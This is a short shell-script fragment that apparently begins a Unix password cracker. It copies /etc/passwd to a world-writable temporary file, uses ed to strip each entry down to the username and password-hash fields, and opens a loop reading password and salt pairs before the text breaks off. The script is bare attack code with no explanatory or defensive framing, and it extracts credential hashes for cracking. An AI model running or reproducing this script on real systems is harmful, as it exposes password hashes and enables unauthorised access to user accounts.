# /bin/sh
TMP1=/tmp/jt$$
PSWD=${1-"/etc/passwd"}
#cut -d: -f1,2 $PSWD > $TMP1
cp $PSWD $TMP1
chmod 777 $TMP1
ed - $TMP1 <<!
1,\$s/^\\(.*:.*\\):.*:.*:.*:.*:.*\$/\\1/
1,\$s/:/ /
w
q
!
cat $TMP1 | while read PASS SEED
do
